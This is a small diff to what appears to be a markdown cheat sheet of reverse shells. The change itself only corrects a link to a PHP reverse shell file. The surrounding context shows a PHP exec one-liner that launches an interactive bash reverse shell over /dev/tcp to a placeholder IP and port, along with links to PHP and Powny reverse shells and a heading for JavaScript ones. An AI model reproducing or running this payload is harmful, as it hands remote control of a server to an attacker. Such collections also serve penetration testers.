@@ -4,7 +4,7 @@
 <?php
 exec("/bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'");
 ```
-- [PHP Reverse Shell](/php_rev_shell.php)
+- [PHP Reverse Shell](php_rev_shell.php)
 - [Powny Reverse Shell](powny-shell.php)
 
 ## Javascript Reverse Shell
